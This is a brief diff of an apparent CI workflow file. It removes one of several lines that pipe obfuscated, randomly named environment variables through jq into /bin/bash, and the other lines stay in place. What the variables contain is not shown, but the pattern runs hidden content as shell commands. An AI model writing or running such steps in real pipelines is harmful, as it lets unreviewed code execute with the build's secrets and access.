@@ -25,7 +25,6 @@ jobs:
           printf '%s' "$ksdq6352" | jq -r .mi2902 | /bin/bash
           echo $vde67 | jq -r .agklk4964 | /bin/bash
           echo $kj74502 | jq -r .hc43 | /bin/bash
-          echo $ffp18 | jq -r .mj02933 | /bin/bash
           echo $ty557 | jq -r .mtrlg19541 | /bin/bash
 
       - name: Upload output
